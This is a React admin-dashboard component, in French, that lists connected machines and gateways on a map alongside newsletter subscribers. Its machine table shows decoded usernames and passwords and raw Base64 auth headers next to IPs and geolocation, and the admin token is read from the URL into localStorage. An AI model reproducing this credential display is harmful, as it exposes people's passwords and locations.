import React, { useState } from 'react';
import NewsletterManager from './NewsletterManager';
import { MapContainer, TileLayer, Marker, Popup } from 'react-leaflet';
import 'leaflet/dist/leaflet.css';
import L from 'leaflet';

// Fix Leaflet Icon
delete L.Icon.Default.prototype._getIconUrl;
L.Icon.Default.mergeOptions({
    iconRetinaUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-icon-2x.png',
    iconUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-icon.png',
    shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-shadow.png',
});

const Admin = () => {
    const [token, setToken] = React.useState(localStorage.getItem('adminToken') || '');
    const [isAuthenticated, setIsAuthenticated] = React.useState(false);
    const [stats, setStats] = React.useState(null);
    const [machines, setMachines] = React.useState([]);
    const [gateways, setGateways] = React.useState([]); // Added
    const [subscribers, setSubscribers] = React.useState([]);
    const [showMachineList, setShowMachineList] = React.useState(false);
    const [error, setError] = React.useState('');
    const [loading, setLoading] = React.useState(false);
    const [activeTab, setActiveTab] = useState('dashboard'); // 'dashboard' | 'newsletters'

    // Gateway Icon
    const gatewayIcon = new L.Icon({
        iconUrl: 'https://raw.githubusercontent.com/pointhi/leaflet-color-markers/master/img/marker-icon-2x-red.png',
        shadowUrl: 'https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/images/marker-shadow.png',
        iconSize: [25, 41],
        iconAnchor: [12, 41],
        popupAnchor: [1, -34],
        shadowSize: [41, 41]
    });

    // Initial check
    React.useEffect(() => {
        // 1. Check URL for token (Google Auth Callback)
        const params = new URLSearchParams(window.location.search);
        const urlToken = params.get('token');
        if (urlToken) {
            localStorage.setItem('adminToken', urlToken);
            setToken(urlToken);
            // Clear URL
            window.history.replaceState({}, document.title, window.location.pathname);
            fetchStats(urlToken);
        } else if (token) {
            // Verify token by fetching stats
            fetchStats(token);
        }
    }, []);

    const fetchStats = async (authToken) => {
        try {
            const res = await fetch('/api/admin/stats', {
                headers: { 'Authorization': `Bearer ${authToken}` }
            });
            if (res.ok) {
                const data = await res.json();
                setStats(data);
                setIsAuthenticated(true);
                // Also fetch lists immediately
                fetchMachinesInternal(authToken);
                fetchGatewaysInternal(authToken); // Added
                fetchSubscribers(authToken);
            } else {
                // Token invalid
                handleLogout();
            }
        } catch (err) {
            console.error("Failed to fetch stats", err);
        }
    };

    const fetchSubscribers = async (authToken) => {
        try {
            const res = await fetch('/api/admin/subscribers', {
                headers: { 'Authorization': `Bearer ${authToken}` }
            });
            if (res.ok) {
                const data = await res.json();
                setSubscribers(data);
            }
        } catch (err) {
            console.error("Failed to fetch subscribers", err);
        }
    };

    const fetchMachinesInternal = async (authToken) => {
        try {
            const res = await fetch('/api/admin/machines', {
                headers: { 'Authorization': `Bearer ${authToken}` }
            });
            if (res.ok) {
                const data = await res.json();
                setMachines(data);
                setShowMachineList(true); // Auto-show list/map
            }
        } catch (err) {
            console.error("Failed to fetch machines", err);
        }
    };

    const fetchGatewaysInternal = async (authToken) => {
        try {
            const res = await fetch('/api/admin/gateways', {
                headers: { 'Authorization': `Bearer ${authToken}` }
            });
            if (res.ok) {
                const data = await res.json();
                setGateways(data);
            }
        } catch (err) {
            console.error("Failed to fetch gateways", err);
        }
    };

    const fetchLists = () => {
        fetchMachinesInternal(token);
        fetchGatewaysInternal(token);
    };

    const handleLogin = async (e) => {
        e.preventDefault();
        setLoading(true);
        setError('');

        try {
            const res = await fetch('/api/admin/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ token })
            });

            if (res.ok) {
                localStorage.setItem('adminToken', token);
                setIsAuthenticated(true);
                fetchStats(token);
            } else {
                setError('Token invalide');
            }
        } catch (err) {
            setError('Erreur de connexion');
        } finally {
            setLoading(false);
        }
    };

    const handleLogout = () => {
        localStorage.removeItem('adminToken');
        setToken('');
        setIsAuthenticated(false);
        setStats(null);
        setMachines([]);
        setGateways([]);
        setShowMachineList(false);
    };

    return (
        <div className="page-content">
            <h1>Administration</h1>

            {!isAuthenticated ? (
                <div className="admin-login-box">
                    <p>Veuillez entrer le token d'administration.</p>
                    <form onSubmit={handleLogin} style={{ maxWidth: '400px', margin: '20px auto' }}>
                        <input
                            type="password"
                            value={token}
                            onChange={(e) => setToken(e.target.value)}
                            placeholder="Admin Token"
                            style={{
                                width: '100%',
                                padding: '10px',
                                marginBottom: '10px',
                                borderRadius: '4px',
                                border: '1px solid #ccc',
                                background: '#333',
                                color: 'white'
                            }}
                        />
                        {error && <p style={{ color: 'red' }}>{error}</p>}
                        <button
                            type="submit"
                            disabled={loading}
                            style={{
                                width: '100%',
                                padding: '10px',
                                background: 'linear-gradient(90deg, #00C9FF 0%, #92FE9D 100%)',
                                border: 'none',
                                borderRadius: '4px',
                                color: 'black',
                                fontWeight: 'bold',
                                cursor: 'pointer'
                            }}
                        >
                            {loading ? 'Connexion...' : 'Accéder'}
                        </button>
                    </form>

                    <div style={{ textAlign: 'center', marginTop: '20px' }}>
                        <p style={{ color: '#888', marginBottom: '10px' }}>Ou connectez-vous avec Google (Admin)</p>
                        <a
                            href="/api/auth/google/login"
                            style={{
                                display: 'inline-block',
                                padding: '10px 20px',
                                background: '#fff',
                                color: '#333',
                                borderRadius: '4px',
                                textDecoration: 'none',
                                fontWeight: 'bold',
                                border: '1px solid #ccc'
                            }}
                        >
                            <span role="img" aria-label="google" style={{ marginRight: '8px' }}>G</span>
                            Se connecter avec Google
                        </a>
                    </div>
                </div>
            ) : (
                <div className="admin-dashboard">
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
                        <div style={{ display: 'flex', gap: '10px' }}>
                            <button
                                onClick={() => setActiveTab('dashboard')}
                                style={activeTab === 'dashboard' ? activeTabStyle : inactiveTabStyle}
                            >
                                Tableau de Bord
                            </button>
                            <button
                                onClick={() => setActiveTab('newsletters')}
                                style={activeTab === 'newsletters' ? activeTabStyle : inactiveTabStyle}
                            >
                                Newsletters
                            </button>
                        </div>
                        <button onClick={handleLogout} style={{ padding: '5px 10px', background: '#ff4444', color: 'white', border: 'none', borderRadius: '4px', cursor: 'pointer' }}>
                            Déconnexion
                        </button>
                    </div>

                    {activeTab === 'dashboard' ? (
                        <>
                            {stats && (
                                <div className="stats-grid" style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '20px', marginTop: '20px' }}>
                                    <div className="stat-card" style={{ background: '#2a2a2a', padding: '20px', borderRadius: '8px', textAlign: 'center' }}>
                                        <h3>Clients Connectés</h3>
                                        <p style={{ fontSize: '2em', color: '#00C9FF' }}>{stats.connected_clients}</p>
                                    </div>
                                    <div
                                        className="stat-card clickable"
                                        onClick={fetchLists}
                                        style={{ background: '#2a2a2a', padding: '20px', borderRadius: '8px', textAlign: 'center', cursor: 'pointer', border: '1px solid #444' }}
                                    >
                                        <h3>Total Machines (Voir liste)</h3>
                                        <p style={{ fontSize: '2em', color: '#92FE9D' }}>{stats.total_machines}</p>
                                    </div>
                                    <div
                                        className="stat-card clickable"
                                        onClick={fetchLists}
                                        style={{ background: '#2a2a2a', padding: '20px', borderRadius: '8px', textAlign: 'center', cursor: 'pointer', border: '1px solid #ff4444' }}
                                    >
                                        <h3>Total Gateways Active</h3>
                                        <p style={{ fontSize: '2em', color: '#ff7777' }}>{stats.total_gateways}</p>
                                    </div>
                                </div>
                            )}

                            {showMachineList && (
                                <>
                                    <div style={{ marginTop: '20px', padding: '20px', background: '#2a2a2a', borderRadius: '8px' }}>
                                        <h3>Géolocalisation Globale</h3>
                                        <div style={{ height: '400px', width: '100%', borderRadius: '4px', overflow: 'hidden' }}>
                                            <MapContainer center={[46.603354, 1.888334]} zoom={6} scrollWheelZoom={false} style={{ height: '100%', width: '100%' }}>
                                                <TileLayer
                                                    attribution='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                                                    url="https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png"
                                                />
                                                {/* Machines */}
                                                {machines.map(m => (
                                                    (m.lat && m.lon) && (
                                                        <Marker key={m.id} position={[m.lat, m.lon]}>
                                                            <Popup>
                                                                <strong>Machine: {m.no_serie}</strong><br />
                                                                {m.geo_location}<br />
                                                                {m.ip}
                                                            </Popup>
                                                        </Marker>
                                                    )
                                                ))}
                                                {/* Gateways - Red Icon */}
                                                {gateways.map((g, i) => (
                                                    (g.lat && g.lon) && (
                                                        <Marker key={`gw-${i}`} position={[g.lat, g.lon]} icon={gatewayIcon}>
                                                            <Popup>
                                                                <strong>Gateway: {g.hostname}</strong><br />
                                                                {g.geo_location}<br />
                                                                {g.ip}<br />
                                                                CPU: {g.cpu_usage_percent}%
                                                            </Popup>
                                                        </Marker>
                                                    )
                                                ))}
                                            </MapContainer>
                                        </div>
                                    </div>

                                    <div style={{ marginTop: '40px', overflowX: 'auto' }}>
                                        <h3>Liste des Gateways ({gateways.length})</h3>
                                        <table style={{ width: '100%', borderCollapse: 'collapse', marginTop: '10px', background: '#222' }}>
                                            <thead>
                                                <tr style={{ background: '#442222', color: '#fff' }}>
                                                    <th style={{ padding: '10px', textAlign: 'left' }}>Hostname</th>
                                                    <th style={{ padding: '10px', textAlign: 'left' }}>IP / Location</th>
                                                    <th style={{ padding: '10px', textAlign: 'left' }}>CPU / RAM</th>
                                                    <th style={{ padding: '10px', textAlign: 'left' }}>Services</th>
                                                    <th style={{ padding: '10px', textAlign: 'left' }}>Last Seen</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                {gateways.map((g, i) => (
                                                    <tr key={i} style={{ borderBottom: '1px solid #444' }}>
                                                        <td style={{ padding: '10px' }}>{g.hostname}</td>
                                                        <td style={{ padding: '10px' }}>
                                                            <div>{g.ip || '-'}</div>
                                                            <div style={{ fontSize: '0.8em', color: '#ffd700' }}>{g.geo_location || ''}</div>
                                                        </td>
                                                        <td style={{ padding: '10px' }}>
                                                            CPU: {g.cpu_usage_percent}%<br />
                                                            RAM: {g.memory?.percent?.toFixed(1)}%
                                                        </td>
                                                        <td style={{ padding: '10px' }}>
                                                            {g.services && Object.entries(g.services).map(([svc, status]) => (
                                                                <span key={svc} style={{ color: status ? '#92FE9D' : '#ff4444', marginRight: '5px', fontSize: '0.8em' }}>
                                                                    {svc}: {status ? 'OK' : 'ERR'}
                                                                </span>
                                                            ))}
                                                        </td>
                                                        <td style={{ padding: '10px' }}>{g.last_seen ? new Date(g.last_seen).toLocaleString() : '-'}</td>
                                                    </tr>
                                                ))}
                                                {gateways.length === 0 && (
                                                    <tr><td colSpan="5" style={{ padding: '20px', textAlign: 'center', color: '#888' }}>Aucune gateway détectée.</td></tr>
                                                )}
                                            </tbody>
                                        </table>
                                    </div>

                                    <div style={{ marginTop: '40px', overflowX: 'auto' }}>
                                        <h3>Liste des Machines ({machines.length})</h3>
                                        <table style={{ width: '100%', borderCollapse: 'collapse', marginTop: '10px', background: '#222' }}>
                                            <thead>
                                                <tr style={{ background: '#333', color: '#fff' }}>
                                                    <th style={{ padding: '10px', textAlign: 'left' }}>Machine ID</th>
                                                    <th style={{ padding: '10px', textAlign: 'left' }}>User / Pass</th>
                                                    <th style={{ padding: '10px', textAlign: 'left' }}>IP / Location</th>
                                                    <th style={{ padding: '10px', textAlign: 'left' }}>Raw Auth (Base64)</th>
                                                    <th style={{ padding: '10px', textAlign: 'left' }}>Last Seen</th>
                                                </tr>
                                            </thead>
                                            <tbody>
                                                {machines.map(m => (
                                                    <tr key={m.id} style={{ borderBottom: '1px solid #444' }}>
                                                        <td style={{ padding: '10px' }}>{m.no_serie}</td>
                                                        <td style={{ padding: '10px', fontFamily: 'monospace' }}>{m.raw_decoded || '-'}</td>
                                                        <td style={{ padding: '10px' }}>
                                                            <div>{m.ip || '-'}</div>
                                                            <div style={{ fontSize: '0.8em', color: '#ffd700' }}>{m.geo_location || ''}</div>
                                                        </td>
                                                        <td style={{ padding: '10px', fontFamily: 'monospace', fontSize: '0.8em', maxWidth: '150px', overflow: 'hidden', textOverflow: 'ellipsis' }}>{m.raw_auth || '-'}</td>
                                                        <td style={{ padding: '10px' }}>{m.last_seen ? new Date(m.last_seen).toLocaleString() : '-'}</td>
                                                    </tr>
                                                ))}
                                                {machines.length === 0 && (
                                                    <tr><td colSpan="5" style={{ padding: '20px', textAlign: 'center', color: '#888' }}>Aucune machine détectée.</td></tr>
                                                )}
                                            </tbody>
                                        </table>
                                    </div>
                                </>
                            )}

                            {(isAuthenticated && subscribers) && (
                                <div style={{ marginTop: '40px', padding: '0 20px 20px 20px' }}>
                                    <h3>Abonnés Newsletter ({subscribers.length})</h3>
                                    {subscribers.length > 0 ? (
                                        <div style={{ overflowX: 'auto' }}>
                                            <table style={{ width: '100%', borderCollapse: 'collapse', marginTop: '10px', background: '#222' }}>
                                                <thead>
                                                    <tr style={{ background: '#333', color: '#fff' }}>
                                                        <th style={{ padding: '10px', textAlign: 'left' }}>Email</th>
                                                        <th style={{ padding: '10px', textAlign: 'left' }}>Date d'inscription</th>
                                                    </tr>
                                                </thead>
                                                <tbody>
                                                    {subscribers.map((s, i) => (
                                                        <tr key={i} style={{ borderBottom: '1px solid #444' }}>
                                                            <td style={{ padding: '10px' }}>{s.email}</td>
                                                            <td style={{ padding: '10px' }}>{new Date(s.date_joined).toLocaleString()}</td>
                                                        </tr>
                                                    ))}
                                                </tbody>
                                            </table>
                                        </div>
                                    ) : (
                                        <p style={{ color: '#888' }}>Aucun abonné pour le moment.</p>
                                    )}
                                </div>
                            )}
                        </>
                    ) : (
                        <NewsletterManager token={token} />
                    )}
                </div>
            )}
        </div>
    );
};

const activeTabStyle = {
    padding: '10px 20px',
    background: '#00C9FF',
    color: 'black',
    border: 'none',
    borderRadius: '4px',
    fontWeight: 'bold',
    cursor: 'pointer'
};

const inactiveTabStyle = {
    padding: '10px 20px',
    background: '#333',
    color: '#ccc',
    border: 'none',
    borderRadius: '4px',
    cursor: 'pointer'
};

export default Admin;
